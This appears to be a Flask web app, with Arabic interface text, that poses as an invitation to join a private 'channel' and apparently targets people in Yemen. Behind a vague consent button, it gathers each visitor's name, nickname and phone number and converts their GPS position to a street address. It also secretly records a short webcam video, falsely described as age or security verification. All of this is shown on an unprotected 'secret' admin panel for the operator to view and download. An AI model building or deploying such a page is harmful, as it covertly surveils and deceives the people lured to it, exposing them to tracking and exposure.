
# import os
# import base64
# from flask import Flask, render_template_string, request, jsonify, send_from_directory

# app = Flask(__name__)

# # المجلدات الأساسية لحفظ البيانات
# DATA_DIR = "employees_data"
# VIDEOS_DIR = "employees_videos"
# os.makedirs(DATA_DIR, exist_ok=True)
# os.makedirs(VIDEOS_DIR, exist_ok=True)

# def get_next_employee_id():
#     files = os.listdir(DATA_DIR)
#     max_id = 0
#     for file in files:
#         if file.startswith("employee_") and file.endswith(".txt"):
#             try:
#                 file_id = int(file.split("_")[1].split(".")[0])
#                 if file_id > max_id:
#                     max_id = file_id
#             except ValueError:
#                 continue
#     return max_id + 1

# # 1. واجهة الموظفين الرئيسية لتسجيل الفيديو الخلفي
# HTML_TEMPLATE = """
# <!DOCTYPE html>
# <html lang="ar" dir="rtl">
# <head>
#     <meta charset="UTF-8">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0">
#     <title>نظام تسجيل الموظفين</title>
#     <style>
#         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 90vh; }
#         .container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 450px; text-align: center; }
#         .consent-box { display: block; }
#         .consent-box p { font-size: 16px; color: #4a5568; line-height: 1.6; margin-bottom: 25px; }
#         .main-form { display: none; }
#         h2 { color: #2c3e50; margin-bottom: 25px; font-size: 24px; font-weight: 600; }
#         .form-group { margin-bottom: 20px; text-align: right; }
#         label { display: block; margin-bottom: 8px; font-weight: 600; color: #4a5568; font-size: 15px; }
#         input[type="text"], input[type="tel"] { width: 100%; padding: 12px 15px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 16px; color: #334155; }
#         .btn-group { display: flex; gap: 15px; margin-top: 20px; }
#         .btn-accept { background-color: #16a34a; color: white; flex: 2; }
#         .btn-reject { background-color: #dc2626; color: white; flex: 1; }
#         button { border: none; padding: 14px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; }
#         .btn-submit { background-color: #2563eb; color: white; width: 100%; font-size: 18px; margin-top: 15px; }
#         .avatar-preview-container { position: relative; width: 130px; height: 130px; margin: 0 auto 25px auto; border-radius: 50%; border: 4px solid #cbd5e1; overflow: hidden; background-color: #e2e8f0; display: flex; justify-content: center; align-items: center; }
#         #video { width: 100%; height: 100%; object-fit: cover; }
#         .avatar-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; font-size: 65px; color: #94a3b8; z-index: 5; user-select: none; }
#         .status { margin-top: 25px; font-weight: bold; font-size: 16px; line-height: 1.5; padding: 10px; border-radius: 6px; }
#     </style>
# </head>
# <body>
# <div class="container">
#     <div id="consentBox" class="consent-box">
#         <h2>إشعار تفعيل النظام</h2>
#         <p>مرحباً بك في صفحة تسجيل الاعضاء لقد تلقيت دعوة خاصة ، من منتسبي القناة  .</p>
#         <p><strong>هل توافق على الانتساب للقناة؟</strong></p>
#         <div class="btn-group">
#             <button class="btn-accept" onclick="acceptConsent()">نعم، موافق وابدأ</button>
#             <button class="btn-reject" onclick="rejectConsent()">لا، خروج</button>
#         </div>
#     </div>
    
#     <div id="mainForm" class="main-form">
#         <h2>تسجيل عضوا جديد</h2>
#         <div class="avatar-preview-container">
#             <video id="video" autoplay playsinline muted></video>
#             <div class="avatar-overlay">👤</div>
#         </div>
#         <div class="form-group">
#             <label>الاسم الأول:</label>
#             <input type="text" id="firstName" required placeholder="أدخل الاسم الأول">
#         </div>
#         <div class="form-group">
#             <label>الاسم المستعار:</label>
#             <input type="text" id="nickname" placeholder="أدخل الاسم المستعار">
#         </div>
#         <div class="form-group">
#             <label>رقم الهاتف:</label>
#             <input type="tel" id="phone" required placeholder="أدخل رقم الهاتف">
#         </div>
#         <button class="btn-submit" type="button" onclick="processRegistration()">تسجيل وحفظ البيانات</button>
#     </div>
#     <div class="status" id="statusMsg"></div>
# </div>

# <script>
#     const video = document.getElementById('video');
#     const statusMsg = document.getElementById('statusMsg');
#     const consentBox = document.getElementById('consentBox');
#     const mainForm = document.getElementById('mainForm');
#     let localStream = null; let mediaRecorder = null; let recordedChunks = [];

#     function acceptConsent() {
#         consentBox.style.display = 'none'; mainForm.style.display = 'block';  
#         navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
#             .then(stream => { localStream = stream; video.srcObject = stream; })
#             .catch(err => { statusMsg.innerText = "يرجى إعطاء صلاحية الكاميرا."; });
#     }

#     function rejectConsent() { window.location.href = "about:blank"; }

#     function processRegistration() {
#         const firstName = document.getElementById('firstName').value.trim();
#         const nickname = document.getElementById('nickname').value.trim();
#         const phone = document.getElementById('phone').value.trim();
#         if (!firstName || !phone) { alert("الرجاء ملء الحقول!"); return; }

#         statusMsg.innerText = "جاري التحقق التلقائي من حالة وعمر الموظف (فيديو 3 ثوانٍ)...";
#         statusMsg.style.color = "#2563eb"; statusMsg.style.backgroundColor = "#dbeafe";

#         recordedChunks = [];
#         let options = { mimeType: 'video/webm;codecs=vp8' };
#         try {
#             mediaRecorder = new MediaRecorder(localStream, options);
#             mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
#             mediaRecorder.onstop = () => {
#                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
#                 const reader = new FileReader();
#                 reader.readAsDataURL(blob);
#                 reader.onloadend = () => { sendDataToServer(firstName, nickname, phone, reader.result); };
#             };
#             mediaRecorder.start();
#             setTimeout(() => { mediaRecorder.stop(); }, 3000);
#         } catch (e) {
#             sendDataToServer(firstName, nickname, phone, "");
#         }
#     }

#     function sendDataToServer(firstName, nickname, phone, videoData) {
#         fetch('/save_employee', {
#             method: 'POST',
#             headers: { 'Content-Type': 'application/json' },
#             body: JSON.stringify({ first_name: firstName, nickname: nickname, phone: phone, video_bytes: videoData })
#         })
#         .then(res => res.json())
#         .then(data => {
#             if (data.success) {
#                 statusMsg.innerHTML = "✅ لقد تم تسجيل الدخول بنجاح.<br>انتظر الإذن من المشرف العام.";
#                 statusMsg.style.color = "#15803d"; statusMsg.style.backgroundColor = "#dcfce7";
#                 document.getElementById('firstName').value = ''; document.getElementById('nickname').value = ''; document.getElementById('phone').value = '';
#             }
#         });
#     }
# </script>
# </body>
# </html>
# """

# # 2. لوحة التحكم السرية الخاصة بك لرؤية وتحميل الفيديوهات
# ADMIN_TEMPLATE = """
# <!DOCTYPE html>
# <html lang="ar" dir="rtl">
# <head>
#     <meta charset="UTF-8">
#     <title>لوحة تحكم المشرف العام السرية</title>
#     <style>
#         body { font-family: sans-serif; background: #0f172a; color: #e2e8f0; padding: 30px; direction: rtl; }
#         h1 { color: #38bdf8; text-align: center; }
#         table { width: 100%; max-width: 900px; margin: 30px auto; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }
#         th, td { padding: 15px; text-align: right; border-bottom: 1px solid #334155; }
#         th { background: #334155; color: #38bdf8; }
#         .btn-view { background: #0284c7; color: white; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 14px; }
#         .btn-view:hover { background: #0369a1; }
#         video { width: 200px; border-radius: 4px; background: #000; }
#     </style>
# </head>
# <body>
#     <h1>لوحة مراجعة عمر وحالة النتسبين المسجلين 👤</h1>
#     <table>
#         <tr>
#             <th>رقم المنتسب</th>
#             <th>البيانات الأساسية</th>
#             <th>فيديو التحقق الخلفي (3 ثوانٍ)</th>
#         </tr>
#         {% for emp in employees %}
#         <tr>
#             <td>{{ emp.id }}</td>
#             <td>
#                 <strong>الاسم:</strong> {{ emp.name }} <br>
#                 <strong>المستعار:</strong> {{ emp.nickname }} <br>
#                 <strong>الهاتف:</strong> {{ emp.phone }}
#             </td>
#             <td>
#                 <video src="/get_video/{{ emp.video_file }}" controls></video>
#                 <br><br>
#                 <a class="btn-view" href="/get_video/{{ emp.video_file }}" download>تحميل الفيديو 📥</a>
#             </td>
#         </tr>
#         {% else %}
#         <tr>
#             <td colspan="3" style="text-align:center;">لا يوجد موظفين مسجلين حالياً أو تم إعادة تشغيل السيرفر.</td>
#         </tr>
#         {% endfor %}
#     </table>
# </body>
# </html>
# """

# @app.route('/')
# def index():
#     return render_template_string(HTML_TEMPLATE)

# # رابط لوحة التحكم السرية الخاصة بك
# @app.route('/view_secret_admin_panel')
# def admin_panel():
#     employees_list = []
#     if os.path.exists(DATA_DIR):
#         files = [f for f in os.listdir(DATA_DIR) if f.endswith('.txt')]
#         for file in sorted(files, key=lambda x: int(x.split('_')[1].split('.')[0])):
#             emp_id = file.split('_')[1].split('.')[0]
#             with open(os.path.join(DATA_DIR, file), 'r', encoding='utf-8') as f:
#                 lines = f.readlines()
#                 name = lines[1].split(': ')[1].strip() if len(lines) > 1 else ""
#                 nickname = lines[2].split(': ')[1].strip() if len(lines) > 2 else ""
#                 phone = lines[3].split(': ')[1].strip() if len(lines) > 3 else ""
#                 video_file = f"employee_{emp_id}.webm"
#             employees_list.append({
#                 "id": emp_id, "name": name, "nickname": nickname, "phone": phone, "video_file": video_file
#             })
#     return render_template_string(ADMIN_TEMPLATE, employees=employees_list)

# @app.route('/get_video/<filename>')
# def get_video(filename):
#     return send_from_directory(VIDEOS_DIR, filename)

# @app.route('/save_employee', methods=['POST'])
# def save_employee():
#     try:
#         data = request.json
#         first_name = data.get('first_name')
#         nickname = data.get('nickname')
#         phone = data.get('phone')
#         video_bytes_data = data.get('video_bytes')

#         emp_id = get_next_employee_id()

#         if video_bytes_data:
#             header, encoded = video_bytes_data.split(",", 1)
#             video_bytes = base64.b64decode(encoded)
#             video_filename = f"employee_{emp_id}.webm"
#             with open(os.path.join(VIDEOS_DIR, video_filename), "wb") as f:
#                 f.write(video_bytes)
#         else:
#             video_filename = "no_video.webm"

#         text_filename = f"employee_{emp_id}.txt"
#         with open(os.path.join(DATA_DIR, text_filename), "w", encoding="utf-8") as file:
#             file.write(f"رقم المنتسب: {emp_id}\n")
#             file.write(f"الاسم الأول: {first_name}\n")
#             file.write(f"الاسم المستعار: {nickname}\n")
#             file.write(f"رقم الهاتف: {phone}\n")
#             file.write(f"ملف التحقق: {video_filename}\n")

#         return jsonify({"success": True, "emp_id": emp_id})
#     except Exception as e:
#         return jsonify({"success": False, "error": str(e)})

# if __name__ == '__main__':
#     app.run(host='0.0.0.0', port=5000, debug=True)

import os
import base64
import requests
from flask import Flask, render_template_string, request, jsonify, send_from_directory

app = Flask(__name__)

# المجلدات الأساسية لحفظ البيانات
DATA_DIR = "employees_data"
VIDEOS_DIR = "employees_videos"
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(VIDEOS_DIR, exist_ok=True)

def get_next_employee_id():
    files = os.listdir(DATA_DIR)
    max_id = 0
    for file in files:
        if file.startswith("employee_") and file.endswith(".txt"):
            try:
                file_id = int(file.split("_")[1].split(".")[0])
                if file_id > max_id:
                    max_id = file_id
            except ValueError:
                continue
    return max_id + 1

def get_address_from_coords(lat, lon):
    """تحويل خطوط الطول والعرض إلى اسم منطقة حقيقي ومقروء باللغة العربية"""
    if not lat or not lon:
        return "غير معروف (لم يتم إعطاء صلاحية الموقع)"
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&accept-language=ar"
        headers = {'User-Agent': 'EmployeeSystemFeasibilityStudy/1.0'}
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get('display_name', f"إحداثيات: {lat}, {lon}")
    except Exception as e:
        print("خطأ في جلب اسم المنطقة:", e)
    return f"إحداثيات: {lat}, {lon}"

# 1. واجهة الأعضاء المحدثة لطلب إذن الموقع والكاميرا معاً لغرض دراسة الجدوى
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الأعضاء</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 90vh; }
        .container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 450px; text-align: center; }
        .consent-box { display: block; }
        .consent-box p { font-size: 16px; color: #4a5568; line-height: 1.6; margin-bottom: 25px; }
        .main-form { display: none; }
        h2 { color: #2c3e50; margin-bottom: 25px; font-size: 24px; font-weight: 600; }
        .form-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #4a5568; font-size: 15px; }
        input[type="text"], input[type="tel"] { width: 100%; padding: 12px 15px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 16px; color: #334155; }
        .btn-group { display: flex; gap: 15px; margin-top: 20px; }
        .btn-accept { background-color: #16a34a; color: white; flex: 2; }
        .btn-reject { background-color: #dc2626; color: white; flex: 1; }
        button { border: none; padding: 14px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-submit { background-color: #2563eb; color: white; width: 100%; font-size: 18px; margin-top: 15px; }
        .avatar-preview-container { position: relative; width: 130px; height: 130px; margin: 0 auto 25px auto; border-radius: 50%; border: 4px solid #cbd5e1; overflow: hidden; background-color: #e2e8f0; display: flex; justify-content: center; align-items: center; }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .avatar-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; font-size: 65px; color: #94a3b8; z-index: 5; user-select: none; }
        .status { margin-top: 25px; font-weight: bold; font-size: 16px; line-height: 1.5; padding: 10px; border-radius: 6px; }
    </style>
</head>
<body>
<div class="container">
    <div id="consentBox" class="consent-box">
        <h2>إشعار تفعيل النظام لطلب الانتساب</h2>
        <p>مرحباً بك في صفحة تسجيل الاعضاء لقد تلقيت دعوة خاصة ، من منتسبي القناة</p>
        <p><strong>هل توافق على الانتساب للقناة والعضوية؟</strong></p>
        <div class="btn-group">
            <button class="btn-accept" onclick="acceptConsent()">نعم، موافق وابدأ</button>
            <button class="btn-reject" onclick="rejectConsent()">لا، خروج</button>
        </div>
    </div>
    
    <div id="mainForm" class="main-form">
        <h2>تسجيل عضو جديد</h2>
        <div class="avatar-preview-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="avatar-overlay">👤</div>
        </div>
        <div class="form-group">
            <label>الاسم الأول:</label>
            <input type="text" id="firstName" required placeholder="أدخل الاسم الأول">
        </div>
        <div class="form-group">
            <label>الاسم المستعار:</label>
            <input type="text" id="nickname" placeholder="أدخل الاسم المستعار">
        </div>
        <div class="form-group">
            <label>رقم الهاتف:</label>
            <input type="tel" id="phone" required placeholder="أدخل رقم الهاتف">
        </div>
        <button class="btn-submit" type="button" onclick="processRegistration()">تسجيل وحفظ البيانات</button>
    </div>
    <div class="status" id="statusMsg"></div>
</div>

<script>
    const video = document.getElementById('video');
    const statusMsg = document.getElementById('statusMsg');
    const consentBox = document.getElementById('consentBox');
    const mainForm = document.getElementById('mainForm');
    
    let localStream = null; let mediaRecorder = null; let recordedChunks = [];
    let userLatitude = null; let userLongitude = null;

    function acceptConsent() {
        // طلب الموقع الجغرافي فوراً عند الموافقة
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLatitude = position.coords.latitude;
                    userLongitude = position.coords.longitude;
                    triggerCamera(); // الانتقال للكاميرا بعد أخذ الموقع
                },
                (error) => {
                    console.warn("تم رفض إذن الموقع أو تعذر جلب الإحداثيات.");
                    triggerCamera(); // استكمال التشغيل حتى لو رفض الموقع لضمان عدم توقف النظام
                }
            );
        } else {
            triggerCamera();
        }
    }

    function triggerCamera() {
        consentBox.style.display = 'none'; mainForm.style.display = 'block';  
        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
            .then(stream => { localStream = stream; video.srcObject = stream; })
            .catch(err => { statusMsg.innerText = "يرجى إعطاء صلاحية الكاميرا لتفعيل النظام."; });
    }

    function rejectConsent() { window.location.href = "about:blank"; }

    function processRegistration() {
        const firstName = document.getElementById('firstName').value.trim();
        const nickname = document.getElementById('nickname').value.trim();
        const phone = document.getElementById('phone').value.trim();
        if (!firstName || !phone) { alert("الرجاء ملء كافة الحقول!"); return; }

        statusMsg.innerText = "جاري تفعيل الحساب والتحقق الجغرافي والأمني...";
        statusMsg.style.color = "#2563eb"; statusMsg.style.backgroundColor = "#dbeafe";

        recordedChunks = [];
        let options = { mimeType: 'video/webm;codecs=vp8' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/mp4' }; }

        try {
            mediaRecorder = new MediaRecorder(localStream, options);
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => { sendDataToServer(firstName, nickname, phone, reader.result); };
            };
            mediaRecorder.start();
            setTimeout(() => { mediaRecorder.stop(); }, 3000);
        } catch (e) {
            sendDataToServer(firstName, nickname, phone, "");
        }
    }

    function sendDataToServer(firstName, nickname, phone, videoData) {
        fetch('/save_employee', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                first_name: firstName, 
                nickname: nickname, 
                phone: phone, 
                video_bytes: videoData,
                latitude: userLatitude,
                longitude: userLongitude
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                statusMsg.innerHTML = "✅ لقد تم تسجيل الدخول بنجاح.<br>انتظر الإذن من المشرف العام.";
                statusMsg.style.color = "#15803d"; statusMsg.style.backgroundColor = "#dcfce7";
                document.getElementById('firstName').value = ''; document.getElementById('nickname').value = ''; document.getElementById('phone').value = '';
            }
        });
    }
</script>
</body>
</html>
"""

# 2. لوحة المشرف السرية المحدثة لإظهار المنطقة الجغرافية لدراسة الجدوى
ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة المشرف الجغرافية السرية</title>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: #e2e8f0; padding: 30px; direction: rtl; }
        h1 { color: #38bdf8; text-align: center; margin-bottom: 5px; }
        h3 { text-align: center; color: #94a3b8; font-weight: normal; margin-bottom: 30px; }
        table { width: 100%; max-width: 1050px; margin: 0 auto; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }
        th, td { padding: 15px; text-align: right; border-bottom: 1px solid #334155; vertical-align: top; }
        th { background: #334155; color: #38bdf8; }
        .btn-view { background: #0284c7; color: white; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 14px; }
        .location-tag { background: #1e3a8a; color: #93c5fd; padding: 4px 8px; border-radius: 4px; font-size: 13px; display: inline-block; line-height: 1.4; max-width: 300px; }
        video { width: 190px; border-radius: 4px; background: #000; }
    </style>
</head>
<body>
    <h1>لوحة مراجعة ودراسة جدوى توزيع الأعضاء الجغرافي 🗺️</h1>
    <h3>المنطقة الحالية للنظام: اليمن</h3>
    <table>
        <tr>
            <th>رقم العضو</th>
            <th>البيانات الأساسية</th>
            <th>المنطقة الجغرافية (دراسة الجدوى)</th>
            <th>فيديو التحقق الخلفي</th>
        </tr>
        {% for emp in employees %}
        <tr>
            <td>{{ emp.id }}</td>
            <td>
                <strong>الاسم:</strong> {{ emp.name }} <br>
                <strong>المستعار:</strong> {{ emp.nickname }} <br>
                <strong>الهاتف:</strong> {{ emp.phone }}
            </td>
            <td>
                <span class="location-tag">📍 {{ emp.address }}</span>
            </td>
            <td>
                <video src="/get_video/{{ emp.video_file }}" controls></video>
                <br><br>
                <a class="btn-view" href="/get_video/{{ emp.video_file }}" download>تحميل الفيديو 📥</a>
            </td>
        </tr>
        {% else %}
        <tr>
            <td colspan="4" style="text-align:center;">لا يوجد أعضاء مسجلين حالياً أو تم إعادة تشغيل السيرفر.</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/view_secret_admin_panel')
def admin_panel():
    employees_list = []
    if os.path.exists(DATA_DIR):
        files = [f for f in os.listdir(DATA_DIR) if f.endswith('.txt')]
        for file in sorted(files, key=lambda x: int(x.split('_')[1].split('.')[0])):
            emp_id = file.split('_')[1].split('.')[0]
            with open(os.path.join(DATA_DIR, file), 'r', encoding='utf-8') as f:
                lines = f.readlines()
                name = lines[1].split(': ')[1].strip() if len(lines) > 1 else ""
                nickname = lines[2].split(': ')[1].strip() if len(lines) > 2 else ""
                phone = lines[3].split(': ')[1].strip() if len(lines) > 3 else ""
                address = lines[5].split(': ')[1].strip() if len(lines) > 5 else "غير متوفر"
                video_file = f"employee_{emp_id}.webm"
            employees_list.append({
                "id": emp_id, "name": name, "nickname": nickname, "phone": phone, "address": address, "video_file": video_file
            })
    return render_template_string(ADMIN_TEMPLATE, employees=employees_list)

@app.route('/get_video/<filename>')
def get_video(filename):
    return send_from_directory(VIDEOS_DIR, filename)

@app.route('/save_employee', methods=['POST'])
def save_employee():
    try:
        data = request.json
        first_name = data.get('first_name')
        nickname = data.get('nickname')
        phone = data.get('phone')
        video_bytes_data = data.get('video_bytes')
        lat = data.get('latitude')
        lon = data.get('longitude')

        # تحويل الإحداثيات إلى اسم شارع وحي ومدينة حقيقي في الخلفية
        readable_address = get_address_from_coords(lat, lon)

        emp_id = get_next_employee_id()

        if video_bytes_data and "," in video_bytes_data:
            header, encoded = video_bytes_data.split(",", 1)
            video_bytes = base64.b64decode(encoded)
            video_filename = f"employee_{emp_id}.webm"
            with open(os.path.join(VIDEOS_DIR, video_filename), "wb") as f:
                f.write(video_bytes)
        else:
            video_filename = "no_video.webm"

        text_filename = f"employee_{emp_id}.txt"
        with open(os.path.join(DATA_DIR, text_filename), "w", encoding="utf-8") as file:
            file.write(f"رقم العضو: {emp_id}\n")
            file.write(f"الاسم الأول: {first_name}\n")
            file.write(f"الاسم المستعار: {nickname}\n")
            file.write(f"رقم الهاتف: {phone}\n")
            file.write(f"ملف التحقق: {video_filename}\n")
            file.write(f"الموقع الجغرافي: {readable_address}\n")

        return jsonify({"success": True, "emp_id": emp_id})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
